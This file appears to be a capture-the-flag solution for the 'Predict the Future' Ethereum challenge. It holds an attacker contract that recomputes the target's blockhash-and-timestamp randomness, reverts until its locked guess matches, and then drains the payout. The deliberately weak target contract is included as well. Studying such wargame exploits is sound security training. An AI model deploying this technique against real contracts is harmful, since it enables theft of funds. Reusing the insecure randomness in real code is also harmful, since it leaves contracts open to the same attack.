pragma solidity ^0.4.21;
import './PredictTheFutureChallenge.sol';

contract Solution{
  address addrChallenge = 0x461E04d40723178373c858fA163e789383D5280D;
  PredictTheFutureChallenge cte = PredictTheFutureChallenge(addrChallenge);
  
  function () public payable{}

  function lockInGuess(uint8 myGuess) public payable{
    require(msg.value == 1 ether);
    cte.lockInGuess.value(msg.value)(myGuess);
  }

  function settle(uint8 myGuess) public{
    uint8 test = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    require(test == myGuess);
    //require(myGuess == (uint8(keccak256(block.blockhash(block.number - 1), now))%10));
    
    cte.settle();
  }

  function destroy() public{
    selfdestruct(msg.sender);
  }
}

pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

